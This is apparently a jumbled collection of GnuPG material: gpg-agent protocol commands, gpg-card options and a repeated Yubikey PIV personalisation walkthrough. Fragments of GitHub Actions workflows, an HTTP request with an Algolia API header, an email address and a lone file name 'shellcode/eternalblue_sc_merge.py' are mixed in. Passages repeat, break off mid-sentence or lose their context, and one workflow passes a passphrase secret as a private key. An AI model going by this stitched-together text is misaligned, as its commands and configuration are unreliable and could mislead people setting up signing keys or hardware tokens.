DC:BD:69:25:48:BD:BB:7E:31:6E:BB:80:D3:00:80:35:D4:F8:A6:CD S ++ ++ # CN=Root-CA/O=Schlapphuete/L=Pullach/C=DE ++ !14:56:98:D3:FE:9C:CA:5A:31:6E:BC:81:D3:11:4E:00:90:A3:44:C2 S ++
++ # Key added on: 2011-07-20 20:38:46 ++ # Fingerprint: 5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81 ++ 34B62F25E277CF13D3C6BCEBFD3F85D08F0A864B 0 confirm ++private-keys-v1.d/ ++gpg-connect-agent 'help COMMAND' /bye ++SETKEY ++Tell the server about the key to be used for decryption. If this is not used, gpg-agent may try to figure out the key by trying to decrypt the message with each key available. ++ ++ PKDECRYPT ++The agent checks whether this command is allowed and then does an INQUIRY to get the ciphertext the client should then send the cipher text. ++ ++ S: INQUIRE CIPHERTEXT ++ C: D (xxxxxx ++ C: D xxxx) ++ C: END ++Please note that the server may send status info lines while reading the data lines from the client. The data send is a SPKI like S-Exp with this structure: ++ ++ (enc-val ++ ( ++ (<param_name1> ) ++ ... ++ (<param_namen> ))) ++Where algo is a string with the name of the algorithm; see the libgcrypt documentation for a list of valid algorithms. The number and names of the parameters depend on the algorithm. The agent does return an error if there is an inconsistency. ++ ++If the decryption was successful the decrypted data is returned by means of "D" lines. ++ ++Here is an example session: ++ ++ C: PKDECRYPT ++ S: INQUIRE CIPHERTEXT ++ C: D (enc-val elg (a 349324324) ++ C: D (b 3F444677CA))) ++ C: END ++ S: # session key follows ++ S: S PADDING 0 ++ S: D (value 1234567890ABCDEF0) ++ S: OK decryption successful ++The “PADDING” status line is only send if gpg-agent can tell what kind of padding is used. As of now only the value 0 is used to indicate that the padding has ++SIGKEY ++This can be used multiple times to create multiple signature, the list of keys is reset with the next PKSIGN command or a RESET. The server tests whether the key is a valid key to sign something and responds with okay. ++ ++ SETHASH --hash=| ++sig-val ++ ( ++ (<param_name1> ) ++ ... ++ (<param_namen> ))) ++The operation is affected by the option ++ ++ OPTION use-cache-for-signing=0|1 ++The default of 1 uses the cache. Setting this option to 0 will lead gpg-agent to ignore the passphrase cache. Note, that there is also a global command line option for gpg-agent to globally disable the caching. ++ ++Here is an example session: ++ ++ C: SIGKEY ++ S: OK key available ++ C: SIGKEY ++ S: OK key available ++ C: PKSIGN ++ S: # I did ask the user whether he really wants to sign ++ S: # I did ask the user for the passphrase ++ S: INQUIRE HASHVAL ++ C: D ABCDEF012345678901234 ++ C: END ++ S: # signature follows ++ S: D (sig-val rsa (s 45435453654612121212)) ++ S: OK ++ GENKEY [--no-protection] [--preset] [<cache_nonce>] ++Invokes the key generation process and the server will then inquire on the generation parameters, like: ++ ++ S: INQUIRE KEYPARM ++ C: D (genkey (rsa (nbits 1024))) ++ C: END ++The format of the key parameters which depends on the algorithm is of the form: ++ ++ (genkey ++ (algo ++ (parameter_name_1 ....) ++ .... ++ (parameter_name_n ....))) ++If everything succeeds, the server returns the public key in a SPKI like S-Expression like this: ++ ++ (public-key ++ (rsa ++ (n ) ++ (e ))) ++Here is an example session: ++ ++ C: GENKEY ++ S: INQUIRE KEYPARM ++ C: D (genkey (rsa (nbits 1024))) ++ C: END ++ S: D (public-key ++ S: D (rsa (n 326487324683264) (e 10001))) ++ S OK key created ++ ISTRUSTED <5e:8d:c4:ad:e7:af:6e:27:8a:d6:13:e4:79:ad:0b:81> ++LISTTRUSTED ++GpgAgent returns a list of trusted keys line by line: ++ ++ S: D 000000001234454556565656677878AF2F1ECCFF P ++ S: D 340387563485634856435645634856438576457A P ++ S: D FEDC6532453745367FD83474357495743757435D S ++ S: OK ++The first item on a line is the hexified fingerprint where MD5 fingerprints are 00 padded to the left and the second item is a flag to indicate the type of key (so that gpg is able to only take care of PGP keys). P = OpenPGP, S = S/MIME. A client should ignore the rest of the line, so that we can extend the format in the future. ++Ok ++Finally a client should be able to mark a key as trusted: ++ ++ MARKTRUSTED fingerprint "P"|"S" ++The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this: ++ ++ S: INQUIRE TRUSTDESC ++ C: D Do you trust the key with the fingerprint @FPR@ ++ C: D bla fasel blurb. ++ C: END ++ S: OK ++GET_PASSPHRASE [--data] [--check] [--no-ask] [--repeat[=N]]
++ [--qualitybar] cache_id
++ [error_message prompt description] ++PRESET_PASSPHRASE [--inquire] <string_or_keygrip> [] ++ ++HAVEKEY keygrips ++ GET_CONFIRMATION description ++ LEARN [--send] ++UPDATESTARTUPTTY ++SETDATA hexstring ++ ++ ++ PKSIGN keyid ++ ++ ++ PKSIGN --hash=algoname keyid ++ ++READCERT hexified_certid|keyid ++READKEY hexified_certid ++SETDATA hexstring ++d ++ ++ PKSIGN keyid ++ LEARN ++ ++ PKSIGN --hash=algoname keyid ++ ++WRITEKEY [--force] keyid ++WRITEKEY [--force] keyid ++PASSWD [--reset] [--nullpin] chvno ++CHECKPIN idstr ++APDU [--atr] [--more] [--exlen[=n]] [hexstring] ++this: ++ ++ S CARD-ATR 3BFA1300FF813180450031C173C00100009000B1 ++--auto-key-import ++ ++command --locate-external-key ++command --locate-external-key ++github/workflows/release.yml: ++ldap://keys.(thedomain) ++‘--auto-key-locate ++ --auto-key-locate ++--auto-key-retrieve ++ ++ ++ honor-keyserver-url ++ ++-sig-keyserver-url ++--recv-key ++honor-keyserver-url ++--use-agent ++--gpg-agent-info ++ ++ ++--no-random-seed-file ++Host: c7-use-3.algolianet. com ++Accept: / ++Sec-Fetch-Site: cross-site ++Accept-Language: en-US, en; q=0.9 ++Accept-Encoding: gzip, deflate, br ++Sec-Fetch-Mode: cors x-algolia-application-id: A7KCVJZ91B ++Origin: https://dashboard.algolia.com ++User-Agent: Mozilla/5.0 (iPhone; CPU iPhone 0S 17_3 like Mac 0S X) AppleWe ++x-algolia-api-key: b3cf***********************米** ++Content-Length: 27 ++Connection: keep-alive ++Content-Type: application/x-www-form-urlencoded ++Sec-Fetch-Dest: empty ++ ++scdaemon.conf ++1 ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++--debug-level level ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++scd-event ++HKCU\Software\GNU\GnuPG:HomeDir ++HKCU\Software\GNU\GnuPG:DefaultLogFile, ++reader_n.status ++HKCU\Software\GNU\GnuPG:HomeDir ++ ++trustlist.txt file ++gpg-agent.conf ++HKCU\Software\GNU\GnuPG:HomeDir ++name: release ++debug-pinentry ++--debug 1024 ++ ++global trustlist (/usr/local/etc/gnupg/trustlist.tx ++ ++Active cards ++Active cards (inserted into a card reader or plugged in tokens) are always tried; they are ordered by their serial numbers. ++gpg-connect-agent updatestartuptty /bye ++Although all GnuPG components try to start the gpg-agent as needed, this is not possible for the ssh support because ssh does not know about it. Thus if no GnuPG tool which accesses the agent has been run, there is no guarantee that ssh is able to use gpg-agent for authentication. To fix this you may start gpg-agent if needed using this simple command: ++ ++gpg-connect-agent /bye ++--scdaemon-program filename ++Use program filename as the Smartcard daemon. The default is installation dependent and can be shown with the gpgconf ++--check-passphrase-pattern file ++--check-sym-passphrase-pattern file ++Check the passphrase against the pattern given in file. When entering a new passphrase matching one of these pattern a warning will be displayed. If file does not contain any slashes and does not start with "~/" it is searched in the system configuration directory (/usr/local/etc/gnupg) ++bin\pinentry.exe, ..\Gpg4win\bin\pinentry.exe, ..\Gpg4win\pinentry.exe, ..\GNU\GnuPG\pinentry.exe, ..\GNU\bin\pinentry.exe, bin\pinentry-basic.exe ++Keys listed in the sshcontrol file ++--disable-extended-key-format ++These options are obsolete and have no effect. The extended key format is used for years now and has been supported since 2.1.12. Existing keys in the old format are migrated to the new format as soon as they are touched. ++ ++--enable-ssh-support ++--enable-win32-openssh-support ++--enable-putty-support ++ ++gpg-connect-agent 'GETINFO s2k_count' /bye ++gpg-connect-agent 'GETINFO s2k_time' /bye ++To view the auto-calibrated count use: ++ ++gpg-connect-agent 'GETINFO s2k_count_cal' /bye ++--ssh-fingerprint-digest ++Keys listed in the sshcontrol file ++ ++Active card ++gpg-connect-agent /bye ++bashrc or whatever initialization file is used for all shell invocations: ++ ++GPG_TTY=$(tty) ++export GPG_TTY ++--daemon [command line] ++server ++ ++agent-program file ¶ ++Specify the agent program to be started if none is running. The default value is determined by running gpgconf with the option --list-dirs. ++ ++--gpg-program file ++Specify a non-default gpg binary to be used by certain commands. ++ ++--gpgsm-program file ++Specify a non-default gpgsm binary to be used by certain commands. ++ ++--chuid uid ++Change the current user to uid which may either be a number or a name. This can be used from the root account to run gpg-card for another user. If uid is not the current UID a standard PATH is set and the envvar GNUPGHOME is unset. To override the latter the option --homedir can be used. This option has only an effect when used on the command line. This option has currently no effect at all on Windows. ++ ++gpg-card ++AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ ++AUTH ++FETCH ++GENERATE [--force] [--algo=algo{+algo2}] keyref ++KDF-SETUP ¶ ++Prepare the OpenPGP card KDF feature for this card. ++ ++LANG [--clear] ++Change the language info for the card. This info can be used by applications for a personalized greeting. Up to 4 two-digit language identifiers can be entered as a preference. The option --clear removes all identifiers. GnuPG does not use this info. ++ ++LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ++NAME [--clear] ++PRIVATEDO [--clear] n [< file] file ++READCERT [--openpgp] certref > file ¶ ++Read the certificate for key certref and store it in file. With option --openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3". ++URL [--clear] ++gpg's. --fetch ++WRITECERT certref < file ¶ ++WRITECERT --openpgp certref [< file|fpr] ++WRITECERT --clear certref ++ --openpgp ++file ++fpr. ++WRITEKEY [--force] keyref keygrip ¶ ++Write a private key object identified by keygrip to the card under the id keyref. ++CHECKKEYS [--ondisk] [--delete-clear-copy] [--delete-protected-copy] ¶ ++Serial number ++A hex-string with the serial number of the card. ++ ++Type ++This gives the type of the card’s application. For example "OpenPGP" or "PIV". ++ ++Keygrip ++A hex-string identifying a key. ++ ++Keyref ++The application slot where the key is stored on the card. For example "OpenPGP.1" ++ ++Status ++The status of the key. The most common value is "shadowed" for a key where only the public key along with the card’s serial number is stored on the disk. The value "clear" indicates that a copy of the card’s key is stored unprotected on disk. The value "protected" indicated that a copy of the car’s key is stored on disk but is protected by a password. The value "error" may also be shown if there was a problem reading information from the card. ++ ++YUBIKEY cmd args ++Various commands pertaining to Yubikey tokens with cmd being: ++ ++LIST ++List supported and enabled Yubikey applications. ++ ++ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] ++DISABLE ++Enable or disable the specified or all applications on the given interface. ++ ++The support for OpenPGP cards in gpg-card is not yet complete. For missing features, please continue to use gpg --card-edit. ++ ++GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: ++ ++Authentication key ++This is a 24 byte key described by the hex string ++010203040506070801020304050607080102030405060708. ++ ++PIV Application PIN ++This is the string 123456. ++ ++PIN Unblocking Key ++This is the string 12345678. ++list (the string gpg/card> ++card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: D2760001240102010006090746250000 ++Application type .: OpenPGP ++Version ..........: 2.1 ++[...] ++on: ++ push: ++ tags: ++ - "v" ++ ++permissions: ++ contents: write ++ ++jobs: ++ release: ++ runs-on: ubuntu-latest ++ steps: ++ - uses: actions/checkout@v3 ++ - uses: cli/gh-extension-precompile@v1 ++ with: ++ go_version: "1.16" ++Then ++- uses: cli/gh-extension-precompile@v1 ++ env: ++ CGO_ENABLED: 1 ++- uses: cli/gh-extension-precompile@v1 ++ with: ++ build_script_override: "script/build.sh" ++name: release ++ ++on: ++ push: ++ tags: ++ - "v" ++ ++permissions: ++ contents: write ++ ++jobs: ++ release: ++ runs-on: ubuntu-latest ++ steps: ++ - uses: actions/checkout@v3 ++ - id: import_gpg ++ uses: crazy-max/ghaction-import-gpg@v5 ++ with: ++ gpg_private_key: {{ secrets.GPG_PASSPHRASE }} ++ - uses: cli/gh-extension-precompile@v1 ++ with: ++ gpg_fingerprint: ${{ steps.import_gpg.outputs.fingerprint }} ++# macOS ++gpg --armor --export-secret-key joe@foo.bar | pbcopy ++ ++# Ubuntu (assuming GNU base64) ++gpg --armor --export-secret-key joe@foo.bar -w0 | xclip ++ ++# Arch ++gpg --armor --export-secret-key joe@foo.bar | xclip -selection clipboard -i ++ ++# FreeBSD (assuming BSD base64) ++gpg --armor --export-secret-key joe@foo.bar | xclip ++ ++name: import-gpg ++ ++on: ++ push: ++ branches: master ++ ++jobs: ++ import-gpg: ++ runs-on: ubuntu-latest ++ steps: ++ - ++ name: Checkout ++ uses: actions/checkout@v4 ++ - ++ name: Import GPG key ++ uses: crazy-max/ghaction-import-gpg@v6 ++ with: ++ gpg_private_key: {{ secrets.PASSPHRASE }} ++ - ++ name: List keys ++ run: gpg -K ++name: import-gpg ++ ++on: ++ push: ++ branches: master
++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpg/card> writecert PIV.9D < encr.crt ++ ++jobs: ++ import-gpg: ++ runs-on: ubuntu-latest ++ steps: ++ - ++ name: Checkout ++ uses: actions/checkout@v4 ++ - ++ name: Import GPG key ++ uses: crazy-max/ghaction-import-gpg@v6 ++ with: ++ gpg_private_key: {{ secrets.PASSPHRASE }} ++ fingerprint: "C17D11ADF199F12A30A0910F1F80449BE0B08CB8" ++ - ++ name: List keys ++ run: gpg -K ++ ++pub ed25519 2021-09-24 [C] ++ 87F257B89CE462100BEC0FFE6071D218380FDCC8 ++ Keygrip = F5C3ABFAAB36B427FD98C4EDD0387E08EA1E8092 ++uid [ unknown] Joe Bar joe@bar.foo ++sub ed25519 2021-09-24 [S] ++ C17D11ADF199F12A30A0910F1F80449BE0B08CB8 ++ Keygrip = DEE0FC98F441519CA5DE5D79773CB29009695FEB ++name: import-gpg ++/.gnupg/scdaemon.conf and by restarting scdaemon, either by killing the process or by using gpgconf --kill scdaemon. Finally the default order in which card applications are tried by scdaemon can be changed. For example to prefer PIV over OpenPGP it is sufficient to add ++ ++application-priority piv ++to ~/.gnupg/scdaemon.conf and to restart scdaemon. This has an effect only on tokens which support both, PIV and OpenPGP, but does not hamper the use of OpenPGP only tokens. ++ ++With one of these methods employed the list command of gpg-card shows this: ++ ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: [none] ++ keyref .....: PIV.9A ++Card authenticat. : [none] ++ keyref .....: PIV.9E ++Digital signature : [none] ++ keyref .....: PIV.9C ++Key management ...: [none] ++ keyref .....: PIV.9D ++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key ++list --cards ++well. The PIV authentication key (internal reference PIV.9A ++Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) is used for encryption ++ ++gpg/card> auth 010203040506070801020304050607080102030405060708 ++gpg/card> auth < myauth.key ++ ++gpg/card> generate --algo=nistp384 PIV.9A ++PIV card no. yk-9074625 detected ++gpg/card> generate --algo=nistp256 PIV.9E ++PIV card no. yk-9074625 detected ++gpg/card> generate --algo=rsa2048 PIV.9C ++PIV card no. yk-9074625 detected ++ ‘--force’ ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++Key management ...: [none] ++ keyref .....: PIV.9D ++keygrip ++gpg ++self-signed X.509 certificate (exit the gpg-card tool, first): ++ ++$ gpgsm --gen-key -o encr.crt ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 1 ++What keysize do you want? (3072) 2048 ++Requested keysize is 2048 bits ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 3 ++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> otto@example.net ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) y ++These parameters are used: ++ Key-Type: RSA ++ Key-Length: 2048 ++ Key-Usage: encrypt ++ Serial: random ++ Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE ++ Name-Email: otto@example.net ++ ++Proceed with creation? (y/N) ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpgsm: certificate created ++Ready. ++$ gpgsm --import encr.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++gpg/card> list ++Reader ...........: 1050:0407:X:0 ++Card type ........: yubikey ++Card firmware ....: 5.1.2 ++Serial number ....: FF020001008A77C1 ++Application type .: PIV ++Version ..........: 1.0 ++Displayed s/n ....: yk-9074625 ++PIN usage policy .: app-pin ++PIN retry counter : - 3 - ++PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E ++ keyref .....: PIV.9A (auth) ++ algorithm ..: nistp384 ++Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C ++ keyref .....: PIV.9E (auth) ++ algorithm ..: nistp256 ++Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED ++ keyref .....: PIV.9C (sign,cert) ++ algorithm ..: rsa2048 ++Key management ...: [none] ++ keyref .....: PIV.9D ++keygrip ++gpgsm --gen-key -o encr.crt ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 1 ++What keysize do you want? (3072) 2048 ++Requested keysize is 2048 bits ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 3 ++Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> otto@example.net ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) y ++These parameters are used: ++ Key-Type: RSA ++ Key-Length: 2048 ++ Key-Usage: encrypt ++ Serial: random ++ Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE ++ Name-Email: otto@example.net ++ ++Proceed with creation? (y/N) ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpgsm: certificate created ++Ready. ++$ gpgsm --import encr.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++ ++gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++gpg/card> writecert PIV.9D < encr.crt ++ ++gpgsm --with-keygrip -k 6309304695z@gmail.com ++Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB ++ keyref .....: PIV.9D (encr) ++ algorithm ..: rsa2048 ++ used for ...: X.509 ++ user id ..: CN=Encryption key for yk-9074625,O=example,C=DE ++ user id ..: 6309304695z@gmail.com ++ ++34798AAFE0A7565088101CC4AE31C5C8C74461CB.key ++ ++$ gpgsm --learn ++$ gpgsm --gen-key -o sign.crt ++Please select what kind of key you want: ++ (1) RSA ++ (2) Existing key ++ (3) Existing key from card ++Your selection? 3 ++Serial number of the card: FF020001008A77C1 ++Available keys: ++ (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 ++ (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 ++ (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 ++ (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 ++Your selection? 3 ++Possible actions for a RSA key: ++ (1) sign, encrypt ++ (2) sign ++ (3) encrypt ++Your selection? 2 ++Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE ++Enter email addresses (end with an empty line): ++> 6309304695z@gmail.com ++> ++Enter DNS names (optional; end with an empty line): ++> ++Enter URIs (optional; end with an empty line): ++> ++Create self-signed certificate? (y/N) ++These parameters are used: ++ Key-Type: card:PIV.9C ++ Key-Length: 1024 ++ Key-Usage: sign ++ Serial: random ++ Name-DN: CN=Signing key for yk-9074625,O=example,C=DE ++ Name-Email: 6309304695z@gmail.com ++ ++Proceed with creation? (y/N) y ++Now creating self-signed certificate. This may take a while ... ++gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED ++gpgsm: certificate created ++Ready. ++$ gpgsm --import sign.crt ++gpgsm: certificate imported ++gpgsm: total number processed: 1 ++gpgsm: imported: 1 ++ ++‘gpgsm --learn’ ++Digital signature’ key ++gpg-card:010203040506070801020304050607080102030405060708 ++ ++shellcode/eternalblue_sc_merge.py ++ ++gpg/card> writecert PIV.9C < sign.crt

on:
push:
branches: master
+AUTHENTICATE [--setkey] [--raw] [< file]|key] +AUTH and set key + +GENERATE [--force] [--algo=algo{+algo2}] keyref +Create a new key on a card. Use --force to overwrite an existing key. Use "help" for algo to get a list of known algorithms. For OpenPGP cards several algos may be given. Note that the OpenPGP key generation is done interactively unless --algo or keyref + +LIST [--cards] [--apps] [--info] [--no-key-lookup] [n] [app] ¶ +L + +READCERT [--openpgp] certref > file ¶ + +openpgp an OpenPGP keyblock wrapped in a dedicated CMS content type (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3" + +WRITECERT certref < file ¶ +WRITECERT --openpgp certref [< file|fpr] +WRITECERT --clear certref +Write a certificate to the card under the id certref. + +WRITEKEY [--force] keyref keygrip ¶ +Write a private key object identified by keygrip to the card under the id keyref. Option --force allows overwriting an existing key +—Shadowed + +YUBIKEY cmd args ¶ +Various commands pertaining to Yubikey tokens with cmd being: + +LIST +List supported and enabled Yubikey applications. + +ENABLE usb|nfc|all [otp|u2f|opgp|piv|oath|fido2|all] +DISABLE +Enable or disable the specified or all applications on the given interface. + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708. + +PIV + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708 + +the string gpg/card> is the prompt + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: D2760001240102010006090746250000 +Application type .: OpenPGP +Version ..........: 2.1 +[...] + +use help yubikey). + +use help yubikey) + +gpg/card> yubikey disable all opgp +gpg/card> yubikey list +Application USB NFC +----------------------- +OTP yes yes +U2F yes yes +OPGP no no +PIV yes no +OATH yes yes +FIDO2 yes yes +gpg/card> reset + +/.gnupg/scdaemon.conf + +application-priority piv + +scdaemon + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: [none]

 keyref .....: PIV.9A
+Card authenticat. : [none]

 keyref .....: PIV.9E
+Digital signature : [none]

 keyref .....: PIV.9C
+Key management ...: [none]

 keyref .....: PIV.9D
+In + +Card authentication key (PIV.9E) is also known as the CAK and used to support physical access applications. The private key is not protected by a PIN and can thus immediately be used. The Digital signature key (PIV.9C) is used to digitally sign documents. The use of the associated private key is protected by the Application PIN which needs to be provided for each signing operation. The Key management key (PIV.9D) + +Card authentication key; however, that key is mandatory by the PIV standard and thus we create it too. Key generation requires that we authenticate to the card. This can be done either on the command line (which would reveal the key): + +gpg/card> auth 010203040506070801020304050607080102030405060708 + +gpg/card> auth < myauth.key + +gpg/card> generate --algo=nistp384 PIV.9A +PIV card no. yk-9074625 detected +gpg/card> generate --algo=nistp256 PIV.9E +PIV card no. yk-9074625 detected +gpg/card> generate --algo=rsa2048 PIV.9C +PIV card no. yk-9074625 detected + +gpg/card> list +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - 3 - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
+Key management ...: [none]

 keyref .....: PIV.9D 
+—force + +$ gpgsm --gen-key -o encr.crt

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 1 +What keysize do you want? (3072) 2048 +Requested keysize is 2048 bits +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 3 +Enter the X.509 subject name: CN=Encryption key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) y +These parameters are used:
Key-Type: RSA
Key-Length: 2048
Key-Usage: encrypt
Serial: random
Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpgsm: certificate created +Ready. +$ gpgsm --import encr.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB +gpg/card> writecert PIV.9D < encr.crt + +[...] +Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+34798AAFE0A7565088101CC4AE31C5C8C74461CB.key from the directory ~/.gnupg/private-keys-v1.d/ + +$ gpgsm --learn +$ gpgsm --gen-key -o sign.crt +Please select what kind of key you want:

(1) RSA
(2) Existing key
(3) Existing key from card +Your selection? 3 +Serial number of the card: FF020001008A77C1 +Available keys:
(1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384
(2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256
(3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048
(4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 +Your selection? 3 +Possible actions for a RSA key:
(1) sign, encrypt
(2) sign
(3) encrypt +Your selection? 2 +Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE +Enter email addresses (end with an empty line): +> otto@example.net +> +Enter DNS names (optional; end with an empty line): +> +Enter URIs (optional; end with an empty line): +> +Create self-signed certificate? (y/N) +These parameters are used:
Key-Type: card:PIV.9C
Key-Length: 1024
Key-Usage: sign
Serial: random
Name-DN: CN=Signing key for yk-9074625,O=example,C=DE
Name-Email: otto@example.net
+Proceed with creation? (y/N) y +Now creating self-signed certificate. This may take a while ... +gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED +gpgsm: certificate created +Ready. +$ gpgsm --import sign.crt +gpgsm: certificate imported +gpgsm: total number processed: 1 +gpgsm: imported: 1 + +gpg/card> writecert PIV.9C < sign.crt + +Reader ...........: 1050:0407:X:0 +Card type ........: yubikey +Card firmware ....: 5.1.2 +Serial number ....: FF020001008A77C1 +Application type .: PIV +Version ..........: 1.0 +Displayed s/n ....: yk-9074625 +PIN usage policy .: app-pin +PIN retry counter : - [verified] - +PIV authentication: 213D1825FDE0F8240CB4E4229F01AF90AC658C2E

 keyref .....: PIV.9A  (auth)
 algorithm ..: nistp384
+Card authenticat. : 7A53E6CFFE7220A0E646B4632EE29E5A7104499C

 keyref .....: PIV.9E  (auth)
 algorithm ..: nistp256
+Digital signature : 32A6C6FAFCB8421878608AAB452D5470DD3223ED

 keyref .....: PIV.9C  (sign,cert)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Signing key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
+Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB

 keyref .....: PIV.9D  (encr)
 algorithm ..: rsa2048
 used for ...: X.509
   user id ..: CN=Encryption key for yk-9074625,O=example,C=DE
   user id ..: <otto@example.net>
